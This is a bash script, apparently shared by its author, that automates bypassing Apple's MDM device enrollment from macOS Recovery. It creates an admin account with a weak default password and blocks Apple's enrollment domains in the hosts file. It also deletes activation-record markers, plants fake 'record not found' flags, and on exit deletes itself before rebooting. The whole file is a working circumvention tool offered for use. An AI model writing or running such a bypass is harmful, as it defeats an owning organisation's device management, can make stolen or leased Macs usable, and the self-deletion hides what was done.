#!/bin/bash

# Global constants
readonly DEFAULT_SYSTEM_VOLUME="Macintosh HD"
readonly DEFAULT_DATA_VOLUME="Macintosh HD - Data"

# Text formatting
RED='\033[1;31m'
GREEN='\033[1;32m'
BLUE='\033[1;34m'
YELLOW='\033[1;33m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
NC='\033[0m'

# Check if a volume exists
checkVolumeExistence() {
    local volumeLabel="$*"
    diskutil info "$volumeLabel" >/dev/null 2>&1
}

# Determine the volume path
defineVolumePath() {
    local defaultVolume=$1
    if checkVolumeExistence "$defaultVolume"; then
        echo "/Volumes/$defaultVolume"
    elif [ -d "/Volumes/Data" ]; then
        echo "/Volumes/Data"
    elif [ -d "/System/Volumes/Data" ]; then
        echo "/System/Volumes/Data"
    else
        echo ""
    fi
}

# Mount a volume if not mounted
mountVolume() {
    local volumePath=$1
    if [ ! -d "$volumePath" ]; then
        diskutil mount "$volumePath"
    fi
}

echo -e "${CYAN} *-------------------*---------------------* ${NC}"
echo -e "${RED} *     Instagram for help: _mrdo_g         * ${NC}"
echo -e "${YELLOW} *         Martin Grigoryan                * ${NC}"
echo -e "${CYAN} *-------------------*---------------------* ${NC}"
echo ""

PS3='Please enter your choice: '
options=("Autobypass on Recovery" "Check MDM Enrollment" "Exit")

select opt in "${options[@]}"; do
    case $opt in
    "Autobypass on Recovery")
        echo -e "\n\t${GREEN}Bypass on Recovery${NC}\n"

        echo -e "${BLUE}Mounting volumes...${NC}"
        systemVolumePath=$(defineVolumePath "$DEFAULT_SYSTEM_VOLUME")
        mountVolume "$systemVolumePath"

        dataVolumePath=$(defineVolumePath "$DEFAULT_DATA_VOLUME")
        mountVolume "$dataVolumePath"

        if [ -z "$dataVolumePath" ]; then
            echo -e "${RED}Failed to determine Data Volume path${NC}"
            break
        fi

        echo -e "${GREEN}Volume preparation completed${NC}\n"

        echo -e "${BLUE}Checking user existence${NC}"
        dscl_path="$dataVolumePath/private/var/db/dslocal/nodes/Default"
        localUserDirPath="/Local/Default/Users"
        defaultUID="501"
        if ! dscl -f "$dscl_path" localhost -list "$localUserDirPath" UniqueID | grep -q "\<$defaultUID\>"; then
            echo -e "${CYAN}Create a new user${NC}"
            read -rp "Full name (default: Apple): " fullName
            fullName="${fullName:=Apple}"

            read -rp "Username (default: Apple, no spaces): " username
            username="${username:=Apple}"

            read -rsp "Password (default: 1234): " userPassword
            userPassword="${userPassword:=1234}"

            echo -e "\n${BLUE}Creating User${NC}"
            dscl -f "$dscl_path" localhost -create "$localUserDirPath/$username"
            dscl -f "$dscl_path" localhost -create "$localUserDirPath/$username" UserShell "/bin/zsh"
            dscl -f "$dscl_path" localhost -create "$localUserDirPath/$username" RealName "$fullName"
            dscl -f "$dscl_path" localhost -create "$localUserDirPath/$username" UniqueID "$defaultUID"
            dscl -f "$dscl_path" localhost -create "$localUserDirPath/$username" PrimaryGroupID "20"
            mkdir -p "$dataVolumePath/Users/$username"
            dscl -f "$dscl_path" localhost -create "$localUserDirPath/$username" NFSHomeDirectory "/Users/$username"
            dscl -f "$dscl_path" localhost -passwd "$localUserDirPath/$username" "$userPassword"
            dscl -f "$dscl_path" localhost -append "/Local/Default/Groups/admin" GroupMembership "$username"
            echo -e "${GREEN}User created${NC}\n"
        else
            echo -e "${BLUE}User already exists${NC}\n"
        fi

        echo -e "${BLUE}Blocking MDM hosts...${NC}"
        hostsPath="$systemVolumePath/etc/hosts"
        blockedDomains=("deviceenrollment.apple.com" "mdmenrollment.apple.com" "iprofiles.apple.com")
        for domain in "${blockedDomains[@]}"; do
            echo "0.0.0.0 $domain" >>"$hostsPath"
        done
        echo -e "${GREEN}Successfully blocked host${NC}\n"

        echo -e "${BLUE}Removing config profiles${NC}"
        configProfilesSettingsPath="$systemVolumePath/var/db/ConfigurationProfiles/Settings"
        touch "$dataVolumePath/private/var/db/.AppleSetupDone"
        rm -rf "$configProfilesSettingsPath/.cloudConfigHasActivationRecord"
        rm -rf "$configProfilesSettingsPath/.cloudConfigRecordFound"
        touch "$configProfilesSettingsPath/.cloudConfigProfileInstalled"
        touch "$configProfilesSettingsPath/.cloudConfigRecordNotFound"
        echo -e "${GREEN}Config profiles removed${NC}\n"

        echo -e "${GREEN}------ Autobypass SUCCESSFULLY ------${NC}"
        echo -e "${CYAN}------ Exit Terminal. Reboot Macbook and ENJOY ! ------${NC}"
        break
        ;;

    "Check MDM Enrollment")
        if [ ! -f /usr/bin/profiles ]; then
            echo -e "\n\t${RED}Don't use this option in recovery${NC}\n"
            continue
        fi

        if ! sudo profiles show -type enrollment >/dev/null 2>&1; then
            echo -e "\n\t${GREEN}Success${NC}\n"
        else
            echo -e "\n\t${RED}Failure${NC}\n"
        fi
        ;;

    "Exit")
        echo -e "\n\t${BLUE}Rebooting...${NC}\n"
        exec rm "$0" && sudo reboot
        ;;

    *)
        echo "Invalid option $REPLY"
        ;;
    esac
done
